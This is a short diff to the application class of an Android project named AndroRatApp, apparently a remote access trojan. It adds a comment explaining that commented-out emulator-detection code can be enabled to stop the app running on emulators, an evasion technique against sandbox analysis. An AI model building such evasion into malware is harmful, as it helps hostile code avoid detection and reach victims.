@@ -25,6 +25,7 @@ class AndroRatApp: Application() {
     override fun onCreate() {
         super.onCreate()
 
+        //enable this to prevent app working on emulators
 //        val isRunningOnEmulatorDetector = EmulatorDetector.isRunningOnEmulator()
 //        if (isRunningOnEmulatorDetector != null && isRunningOnEmulatorDetector) {
 //            log("Emulator detected!")
